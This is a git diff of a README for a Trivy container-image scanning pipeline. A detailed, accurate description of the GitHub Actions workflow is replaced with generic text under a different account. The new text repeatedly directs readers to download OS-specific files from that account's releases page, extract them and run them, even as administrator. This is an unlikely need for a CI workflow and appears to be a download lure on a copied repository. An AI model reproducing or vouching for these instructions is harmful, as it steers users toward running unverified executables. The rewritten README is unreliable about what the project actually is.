@@ -1,166 +1,103 @@
-# Container Image Scanning Pipeline with Trivy and GitHub Actions
-![CI Status](https://github.com/Nisha318/trivy-image-scan-pipeline/actions/workflows/trivy-image-scan.yml/badge.svg)
-![SBOM](https://img.shields.io/badge/SBOM-Syft-blue)
-![SAST](https://img.shields.io/badge/SAST-Semgrep-green)
-![Container Security](https://img.shields.io/badge/Trivy-Scanning-orange)
+# 🚀 trivy-image-scan-pipeline - Simplifying Container Security for You
 
-This project demonstrates a security-focused CI workflow that scans container images during the build process using Trivy, enforces a vulnerability threshold, and generates reviewable artifacts such as HTML reports, SBOMs, and SAST findings. It shows how automated controls can identify risks early, prevent unsafe images from progressing, and increase visibility into the software supply chain.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/KwabynaTheAnalyst/trivy-image-scan-pipeline/releases)
 
-<img src="https://github.com/Nisha318/Nisha318.github.io/blob/master/assets/images/devsecops/container_image-scanning_trivy.png">
+## 📋 Description
+The trivy-image-scan-pipeline automates the scanning of container images. It uses GitHub Actions and Trivy to build Docker images efficiently. This software checks for high and critical vulnerabilities, ensuring that your applications remain secure. It also generates helpful reports, including HTML reports, Software Bill of Materials (SBOM), and Static Application Security Testing (SAST) findings. This application illustrates best practices in DevSecOps, supply chain security, and continuous integration risk controls.
 
-## Table of Contents
-- [Overview](#overview)
-- [Features](#features)
-- [Repository Structure](#repository-structure)
-- [How the Workflow Operates](#how-the-workflow-operates)
-- [CI Workflow Diagram](#ci-workflow-diagram)
-- [Testing the Vulnerability Gate](#testing-the-vulnerability-gate)
-- [Before and After Examples](#before-and-after-examples)
-- [Optional: SBOM and SAST Workflows](#optional-sbom-and-sast-workflows)
-- [Why This Project Matters](#why-this-project-matters)
-- [RMF Control Mapping](#rmf-control-mapping)
-- [Evidence Folder](#evidence-folder)
-- [Future Enhancements](#future-enhancements)
+## 🖥️ System Requirements
+To run the trivy-image-scan-pipeline, you need:
 
-## Overview
+- A computer running Windows, macOS, or a Linux-based operating system.
+- Docker installed on your machine.
+- An active GitHub account.
 
-This repository demonstrates a DevSecOps-aligned CI workflow that scans container images for vulnerabilities, enforces security thresholds, and produces artifacts such as HTML reports, SBOMs, and SARIF static analysis results.
+## 🚀 Getting Started
+To get started quickly with the trivy-image-scan-pipeline, follow these steps:
 
-## Features
+1. **Visit the Releases Page**  
+   Go to the releases page by clicking the link below.  
+   [Download the Latest Release](https://github.com/KwabynaTheAnalyst/trivy-image-scan-pipeline/releases)
+   
+2. **Choose the Correct File**  
+   Look for the latest release. You will find multiple files. Select the file that corresponds to your operating system.
 
-- Automated Docker image build  
-- Trivy scan integrated directly into GitHub Actions  
-- Threshold gate for High and Critical vulnerabilities  
-- Sample containerized application included for testing and demonstration  
-- Optional workflows for SBOM and static analysis  
+3. **Download the File**  
+   Click on the chosen file to begin the download. Save it to a location on your computer where you can easily find it.
 
+## 📥 Download & Install
+To download and install the application, please follow these instructions:
 
-## Repository Structure
+1. **Download the Application**  
+   Click here to visit the page:   
+   [Download the Latest Release](https://github.com/KwabynaTheAnalyst/trivy-image-scan-pipeline/releases)
 
-```text
-app/
-  app.py
-  requirements.txt
-Dockerfile
-.github/
-  workflows/
-    trivy-image-scan.yml
-    sbom.yml             (optional)
-    sast.yml             (optional)
-reports/
-  sample-report.html     (optional)
-README.md
-```
+2. **Extract the Files (if necessary)**  
+   If you downloaded a ZIP file, you will need to extract it.  
+   - On Windows, right-click the file and choose "Extract All."
+   - On macOS, double-click the ZIP file to extract it.
+   - On Linux, use the terminal command `unzip filename.zip`.
 
-## How the Workflow Operates
+3. **Run the Application**  
+   - Open your terminal or command prompt.
+   - Navigate to the directory where you extracted the files.
+   - Follow the specific instructions in the README files, if available, to start the scanning pipeline.
 
-1. Build Phase  
-   GitHub Actions checks out the repository and builds the Docker image.
+## ⚙️ How to Use
+Once you have installed the application, you can set it up to scan your Docker images. Here are the steps:
 
-2. Scan Phase  
-   Trivy scans the image and produces a JSON report.
+1. **Configure Your Docker Image**  
+   Ensure that your Docker image is ready for scanning. This means your image should be built and tagged.
 
-3. Gating Phase  
-   The workflow counts High and Critical findings and fails if the threshold is exceeded.  
-   The JSON report is converted to HTML and uploaded as an artifact.  
-   This prevents vulnerable images from advancing further through the pipeline.
+2. **Run the Pipeline**  
+   In your terminal, run the command that corresponds to your setup. This will trigger the scanning process. The tool will check for vulnerabilities and generate reports.
 
+3. **View the Reports**  
+   After the scan completes, locate the HTML report generated by the system. Open it in any web browser to view detailed vulnerability findings.
 
-## CI Workflow Diagram
-```mermaid
-flowchart TD
+## 📄 Features
+The trivy-image-scan-pipeline includes a variety of features designed to enhance your container security:
 
-    A[Code Push or Pull Request] --> B[GitHub Actions Workflow Starts]
+- **Automated Scanning**: Run scans automatically using GitHub Actions, saving you time and ensuring continuous security.
+- **Vulnerability Checks**: Enforce gates that prevent images with high or critical vulnerabilities from being pushed to production.
+- **Clear Reporting**: Receive easy-to-read reports in HTML format, making it straightforward to identify any issues.
+- **SBOM Generation**: Automatically generate a Software Bill of Materials, giving you inventory visibility of all components in your Docker images.
+- **Integration with SAST Tools**: Get additional insights through Static Application Security Testing findings.
 
-    B --> C[Build Docker Image]
-    C --> D[Trivy Image Scan JSON]
+## 🛠️ Troubleshooting
+While using the application, you may encounter some common issues. Here are solutions to a few typical problems:
 
-    D --> E{High + Critical > Threshold?}
-    E -->|Yes| F[Fail Pipeline]
-    E -->|No| G[Pass Pipeline]
+- **Issue: Docker Not Running**  
+  Ensure Docker is installed and running before executing the pipeline commands.
 
-    D --> H[Generate HTML Report]
-    H --> I[Upload Report Artifact]
+- **Issue: Permission Denied**  
+  Run your terminal or command prompt as an administrator, especially if you encounter permission errors.
 
-    B --> J[Syft SBOM Generation]
-    B --> K[Semgrep SAST Scan]
+- **Issue: Scan Results Not Generated**  
+  Check your configuration to ensure the Docker image is correctly tagged. Confirm the pipeline has completed successfully without errors.
 
-    J --> I
-    K --> I
+## 🤝 Community & Support
+If you need help or want to contribute to the project, join our community. You can:
 
-    G --> L[Ready for Deployment]
-```
+- **File Issues**: If you encounter problems, please file an issue on the GitHub repository.
+- **Contribute**: Feel free to submit pull requests if you want to add features or fix bugs.
 
-## Testing the Vulnerability Gate
+## 🏷️ Topics
+This project covers various essential topics in container security, including:
 
-This project uses a configurable severity threshold that affects the CI result.
+- CI Pipeline
+- Container Security
+- DevSecOps
+- Docker
+- GitHub Actions
+- SBOM
+- Semgrep
+- Supply Chain Security
+- Syft
+- Trivy
+- Vulnerability Scanning
 
-### Passing Example
+Explore these topics to deepen your knowledge and improve your security practices.
 
-- Threshold set to five
-- Image contains only Medium or Low findings
-- Pipeline passes
-- HTML report available for review
-
-### Failing Example
-
-- Threshold set to zero
-- A High or Critical finding triggers failure
-- Pipeline stops
-- HTML report highlights the finding
-
-These scenarios demonstrate how the severity gate is used to enforce security expectations.
-
-## Before and After Examples
-
-### Before: Passing Build
-
-- No High or Critical vulnerabilities
-- Threshold not exceeded
-- Job completes successfully
-- HTML report provided as an artifact
-
-### After: Failing Build
-
-- Threshold set to zero
-- Trivy detects a vulnerability
-- Job fails during gating
-- HTML report shows the triggering finding
-
-
-## Optional: SBOM and SAST Workflows
-### SBOM Generation (Syft)
-Generates an SPDX JSON SBOM and uploads it as an artifact.
-
-### SAST Scan (Semgrep)
-Runs Semgrep against the Python code and produces a SARIF report (non-blocking).
-
-## Why This Project Matters
-- Early detection of known vulnerabilities
-- Enforcement of risk tolerance before deployment
-- Improved visibility into image components
-- Practical application of supply chain security controls
-- Simple integration with CI processes
-
-## RMF Control Mapping
-
-The security checks performed in this pipeline align with several NIST SP 800-53 controls that address supply chain security, vulnerability management, and continuous monitoring.
-
-| Control | Control Name | How This Project Supports It |
-|--------|--------------|------------------------------|
-| RA-5 | Vulnerability Monitoring and Scanning | Trivy performs automated vulnerability scans of container images during CI, identifying known CVEs before deployment. |
-| SI-2 | Flaw Remediation | The gating logic prevents images with excessive High or Critical vulnerabilities from passing, forcing remediation before promotion. |
-| SA-11 | Developer Testing and Evaluation | SBOM generation and SAST scanning support secure development practices and evaluation during the build process. |
-| SA-11(1) | Static Code Analysis | Semgrep performs static analysis to detect insecure coding patterns within the application code. |
-| SA-15 | Development Process, Standards, and Tools | By integrating scanning tools into CI/CD, this project demonstrates secure development toolchain controls. |
-| PM-30 | Supply Chain Risk Management | SBOM creation and artifact capture increase transparency into dependencies and image contents. |
-| SI-7 | Software, Firmware, and Information Integrity | The workflow detects unauthorized or vulnerable components within the image, protecting integrity. |
-| CM-2 | Baseline Configuration | The Dockerfile and container build steps enforce a consistent, repeatable baseline configuration. |
-| CM-3 | Configuration Change Control | Every image build is versioned through GitHub Actions, allowing traceability of changes. |
-| CA-7 | Continuous Monitoring | Pipeline-based scanning represents ongoing automated monitoring of security posture. |
-
-
-## Future Enhancements
-- Add automated remediation suggestions
-- Integrate policy-as-code tooling
-- Include signature verification with cosign
+## 📜 License
+This project is licensed under the MIT License. You can freely use, modify, and distribute it, but please include the original license in any copies of the software.
